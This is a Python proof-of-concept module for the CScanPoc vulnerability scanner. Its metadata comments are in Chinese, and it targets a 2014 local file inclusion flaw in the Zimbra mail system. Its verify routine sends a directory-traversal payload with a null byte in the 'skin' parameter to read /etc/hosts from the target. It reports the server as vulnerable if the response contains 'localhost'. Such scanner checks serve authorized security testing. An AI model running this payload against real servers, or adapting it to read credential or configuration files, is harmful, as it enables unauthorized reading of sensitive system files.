# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zimbra_0101'  # 平台漏洞编号
    name = 'zimbra邮箱系统本地包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-01-24'  # 漏洞公布时间
    desc = '''
        Zimbra提供一套开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。它最大的特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox,Safari和IE浏览器。
        Zimbra邮箱系统本地包含漏洞，攻击者可以通过本地文件包含来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=45515'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zimbra'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2586b0b5-0632-4e28-9803-560a4160e24e'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/res/I18nNsg,AjxMsg,ZmMsg,AjxKeys,ZmKeys,ZdMss,Ajx&20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/hosts%00"
            url = self.target + payload
            response = requests.get(url)
            if response.status_code == 200 and "localhost" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
